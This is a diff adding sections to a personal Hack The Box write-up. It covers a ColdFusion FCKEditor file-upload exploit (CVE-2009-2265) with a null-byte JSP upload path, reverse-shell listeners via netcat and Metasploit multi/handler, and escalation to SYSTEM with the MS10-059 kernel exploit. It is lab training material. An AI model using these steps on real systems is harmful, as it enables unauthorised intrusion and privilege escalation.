@@ -2,6 +2,9 @@
 ### Index
 1. Locating nmap NSE script 
 2. Enumerating RPC
+3. Adobe Cold Fusion FCKEditor File upload vulnerability. [CVE-2009-2265](https://www.exploit-db.com/exploits/50057)
+4. Upgrading the NetCat Shell (Gained by executing the python exploit) to Meterpreter shell and then running local exploit suggester.
+5. 
 
 
 
@@ -88,4 +91,56 @@ Now the Exploit-DB exploit that I have used earlier, make sense that my JSP shel
 /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{filename}.jsp%00
 ```
 
-I have the path present on my target and I use the exploit to capture the Tolis user flag.
+I have the path present on my target and I use the exploit to capture the Tolis user flag. 
+
+# Shell Upgrading Notes
+
+My python exploit code has the following line. 
+```
+os.system(f'nc -nlvp {lport}')
+```
+
+I comment out the above line in the python exploit and use the following msf module to start the netcat listener so that I can capture the meterpreter shell instead of the netcat shell.
+```
+msf>use exploit/multi/handler
+msf>set LHOST 10.10.16.5
+msf>set LPORT 4444
+msf>run
+[*] Started reverse TCP handler on 10.10.16.5:4444 
+
+[*] Command shell session 1 opened (10.10.16.5:4444 -> 10.10.10.11:55411) at 2024-08-06 00:15:27 -0400
+
+Now use CTRL+Z to throw the shell in the background and use 'local_exploit_suggester'. For this machine it was not helpful. Still i tried.
+```
+
+# Privilege Escalation 
+
+### Initial Enum using winPEAS.bat
+
+UAC is Enabled. but according to HackTricks, I need a GUI access
+```
+ [+] UAC Settings                                                                                                                                                       
+   [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on                                                                            
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access           
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System                                                                            
+    EnableLUA    REG_DWORD    0x1
+```
+
+I tried mimikatz.exe and I did not have any good luck there. Reading the Machine Info on Hack The Box, i notice that it was mention that "privilege escalation is achieved using the MS10-059 exploit. " [This Exploit](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri/Compiled) was used to obtained the Administrator Shell and root flag.
+
+```
+$ nc -lvnp 8000                                                                      
+listening on [any] 8000 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.10.11] 55575
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\tolis\Documents>whoami
+whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop>more root.txt
+more root.txt
+fcb***********************
+```
+
